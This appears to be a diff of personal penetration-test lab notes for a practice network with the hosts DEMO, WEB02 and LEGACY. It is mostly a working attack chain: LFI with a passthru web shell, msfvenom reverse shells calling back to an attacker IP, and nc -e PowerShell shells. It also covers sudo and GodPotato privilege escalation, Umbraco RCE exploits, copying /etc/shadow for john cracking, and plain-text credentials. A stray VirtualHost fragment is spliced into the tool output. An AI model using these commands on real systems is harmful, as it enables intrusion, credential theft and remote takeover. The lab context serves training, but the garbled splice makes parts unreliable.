@@ -115,7 +115,9 @@ anita@demo:$ cat local.txt
 ...
 [+] [CVE-2021-3156] sudo Baron Samedit
 [+] [CVE-2021-3156] sudo Baron Samedit 2
-
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
 ...
 
 # Upload the same exploit script from WEB01
@@ -124,10 +126,47 @@ python3 exp_nss.py
 # We notice that 8000 port is running locally on DEMO, and I think I would like to reverse proxy into my localhost and check
 ssh -o StrictHostKeyChecking=no -N -i anita-id_ecdsa anita@192.168.197.246 -p2222 -L 8000:localhost:8000
 # Access to the http://localhost:8000, nothing much the website can tell.
-# We can further dig into the file.
-
-
-
+# We can further dig into the file that we had captured from the linpeas which is /var/www/html folder.
+# Then I found a /var/www/internal/backend folder, when access through 127.0.0.1:8000/backend it looks like a web console, but unable to signin cause we dont have any user information. 
+# Lookthrough the source code of the backend folder index.php
+```
+<?php 
+$which_view=$_GET['view'];
+if(isset($which_view)) {
+    include("views/" . $which_view);
+} else {
+    header('Location: /backend/?view=user.inc');
+}
+?>
+```
+# It seems like LFI vulnerability is exist
+# We can test the LFI on the webserver, lets try the same vulnerability LFI from WEB01.
+http://127.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd
+# From the /var/crash/ folder we did found the test.php, where I think it can be abused to run the cmd code
+var/crash$ cat test.php
+<?php echo passthru($_GET["cmd"]); ?>
+# Lets try, yes it do return www-data 
+http://127.0.0.1:8000/backend/?view=../../../../../../../../var/crash/test.php&cmd=whoami
+http://127.0.0.1:8000/backend/?view=../../../../../../../../var/crash/test.php&cmd=sudo -l
+...
+Matching Defaults entries for www-data on demo: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User www-data may run the following commands on demo: (ALL) NOPASSWD: ALL 
+...
+# It can execute SUDO without password
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=6666 -f elf -o cute.elf
+chmod 777 cute.elf
+rlwrap nc -lvnp 6666
+# Use this website for urlencoder
+https://www.urlencoder.io/
+cmd=sudo%20chmod%20777%20cute.elf
+cmd=sudo%20.%2Fcute.elf
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@demo:/root# cat proof.txt
+cp /etc/shadow .
+cp /etc/passwd .
+scp -P 2222 -i anita-id_ecdsa anita@192.168.197.246:/home/anita/passwd .
+scp -P 2222 -i anita-id_ecdsa anita@192.168.197.246:/home/anita/shadow .
+unshadow passwd shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 
 # EXTERNAL
 sudo smbmap --host-file iplists.txt -u john
@@ -201,9 +240,143 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165  LPORT=8888 -f dl
 xfreerdp /u:mark /p:'!8@aBRBYdb3!' /v:192.168.197.248 /cert-ignore +drive:/home/kali/Desktop,/smb
 # :) Fuck
 PS C:\Users\mark\Desktop> type proof.txt
-# Lets upload the dll payload again to the SYSTEM ENV PATH folder and wait for 1 minutes, named it to BetaLibrary.Dll
-# We have the mark user a.k.a Administrator, thats good for now. We may proceed to another machine now.
+# We have the mark user a.k.a Administrator, thats good for now. We may proceed to WEB02 machine.
 
+# WEB02
+# Access to the Websites found nothing, then we can try there is a crackmapexec smb and rdp brute force with the current username and password we have.
+crackmapexec smb iplist.txt -u user.txt -p pass.txt --continue-on-success
+crowbar -b rdp -s 192.168.197.247/32 -U user.txt -C pass.txt
+# None of them are found :D, lets try with nmap for full scanning again.
+nmap -sV -T4 -p- 192.168.197.247
+# After a full scan I found a FTP port in 14020, lets try to check is it possible to have any more information
+...
+14020/tcp open  ftp     FileZilla ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
+|_ftp-bounce: bounce working!
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+...
+# Anonymous FTP login allowed, lets check that umbraco.pdf
+ftp 192.168.197.247 -p 14020
+username: anonymous
+password: anonymous
+ftp> get umbraco.pdf
+# Open the pdf and one line do capture our attention
+...
+You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
+instances on IIS servers (pass "OathDeeplyReprieve91").
+IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
+o e.g. web02.relia.com, not just web02.
+...
+# Here saying Umbraco only allow to be access through FQDN instead of IP. Thats means we need to define the DNS
+sudo nano /etc/hosts
+...
+192.168.197.247 web02.relia.com
+...
+# Now we can access through FQDN and login with the user account found
+http://web02.relia.com:14080/
+mark@relia.com:OathDeeplyReprieve91
+# We can view the Umbraco version is 7.12.4
+searchsploit umbraco 
+...
+Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                        | aspx/webapps/46153.py
+Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                        | aspx/webapps/49488.py
+...
+# Lets try with these exploit
+searchsploit -m 46153
+# Some modification are required on the code
+...
+login = "mark@relia.com";
+password="OathDeeplyReprieve91";
+host = "web02.relia.com:14080";
+...
+# Looks like this script unable to work... lets try another one
+searchsploit -m 49488
+# Then found a better exploit script from Github
+https://github.com/Jonoans/Umbraco-RCE
+python3 exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -w http://web02.relia.com:14080 -i 192.168.45.165
+# Unable to get interactive shell, lets create a payload and try
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f exe -o met.exe
+PS C:\inetpub\temp> iwr -uri http://192.168.45.165:8088/RELIA/met.exe -Outfile met.exe
+# Go to metasploit
+whoami /priv
+...
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+...
+# Lets try to upload PrintSpoofer
+PS C:\users\public\Downloads> .\printspoof.exe -c "cmd -c C:\users\public\Downloads\met.exe"
+# Operation failed, lets try GodPotato
+PS C:\users\public\Downloads> iwr -uri http://192.168.45.165:8088/Windows/Priv-Esc/GodPotato-NET4.exe -Outfile godpotato.exe
+PS C:\users\public\Downloads> .\godpotato.exe -cmd "C:\users\public\Downloads\met.exe"
+[*] Command shell session 2 opened (192.168.45.165:8888 -> 192.168.197.247:49904) at 2024-06-01 23:02:23 +0800
+msf6 exploit(multi/handler) > sessions -i 2 -t 100
+C:\users\public\Downloads>whoami
+nt authority\system
+PS C:\> cat local.txt
+PS C:\Users\Administrator\Desktop> type proof.txt
 
+# LEGACY
+nmap -A -T4 -p- 192.168.197.249 
+gobuster dir -u http://192.168.197.249:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+# Not much value information, lets try dirb
+dirb http://192.168.197.249:8000
+...
++ http://192.168.197.249:8000/cms/admin.php (CODE:200|SIZE:1117)     
+...
+# We tried admin:admin and it access lel.
+Searchsploit RiteCMS
+...
+RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)                       | php/webapps/50616.txt
+...
+searchsploit -m 50616
+# Follow to the PoC method 2, we can use burpsuite to change intercept file upload by changing its extensions to bypass restrictions. 
+http://192.168.197.249:8000/cms/media/pw0ny-shell.pHp
+adrian@LEGACY:C:\Users\adrian\Desktop# type local.txt
+# Change the shell by upload met.exe and upload winpeas
+[adrian-winpeas.md]
+...
+C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+...
 
+type ..\ConsoleHost_history.txt
+...
+echo "Let's check if this script works running as damon and password i6yuT6tym@"
+echo "Don't forget to clear history once done to remove the password!"
+Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
+...
+# We obtain the damon password
+C:\Users\Public\Downloads>net user damon
+# Damon is a local administrator. Lets run the shell as damon. I upload RunasCS.exe 
+.\run.exe 'damon' 'i6yuT6tym@' 'C:\Users\Public\Downloads\nc.exe 192.168.45.165 6667 -e powershell.exe'
+PS C:\Users\damon\Desktop> type proof.txt
+# Lets explore more what can we get from this machine
+PS C:\staging\.git\logs> cat HEAD
+...
+0000000000000000000000000000000000000000 967fa71c359fffcbeb7e2b72b27a321612e3ad11 damian <damian> 1666256797 -0700 commit (initial): V1
+...
+# damian user get
+git show
+...
+commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
+Author: damian <damian>
+Date:   Thu Oct 20 02:07:42 2022 -0700
 
+    Email config not required anymore
+
+diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
+deleted file mode 100644
+index 77e370c..0000000
+--- a/htdocs/cms/data/email.conf.bak
++++ /dev/null
+@@ -1,5 +0,0 @@
+-Email configuration of the CMS
+-maildmz@relia.com:DPuBT9tGCBrTbR
+-
+-If something breaks contact jim@relia.com as he is responsible for the mail server. 
+-Please don't send any office or executable attachments as they get filtered out for security reasons.
+\ No newline at end of file
+...
+# Get the maildmz@relia and jim@relia.com
+# I think thats far I can go with the staging folder.. Lets try the mimikatz.. Unfortunately damon permisison does not enough to capture from memory, lets access to NT/AUTHORITY using godpotato
+PS C:\users\public\Downloads> .\godpotato.exe -cmd "C:\users\public\Downloads\met.exe"
